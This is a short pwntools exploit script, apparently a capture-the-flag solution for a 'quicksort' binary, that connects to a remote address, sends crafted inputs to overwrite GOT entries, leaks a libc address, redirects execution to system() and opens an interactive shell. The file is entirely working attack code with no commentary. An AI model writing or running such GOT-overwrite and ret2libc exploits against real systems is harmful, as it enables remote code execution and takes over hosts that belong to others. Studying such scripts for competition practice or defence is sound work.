from pwn import *

#r = process('./quicksort')
r = remote('34.92.96.238', 10000)

r.sendafter('how many numbers do you want to sort?\n', '2\n')
pause()
r.sendafter('number:', '1\n')
r.sendafter('number:', '134515145' + '\x00'*7 + p32(0x2) + p32(0x1) + p32(0x0) + p32(0x0804a014) + '\n')
r.recvuntil('Here is the result:\n')
libc = 0x100000000 + int(r.recvuntil(' ').split(' ')[0]) - 0x5f3e0
log.success('Libc @ ' + hex(libc))
r.sendafter('how many numbers do you want to sort?\n', '1\n')
r.sendafter('number:', str(-(0x100000000 - (libc + 0x3ada0))) + '\x00'*(0x10-len(str(libc + 0x3ada0))) + p32(0x2) + p32(0x0) + p32(0x0) + p32(0x0804a018) + '\n')
r.sendafter('number:', '\x00'*0x10 + p32(0x0) + p32(0x59772/4) + p32(0x0) + p32(libc + 0x15ba0b) + '\n')

r.interactive()
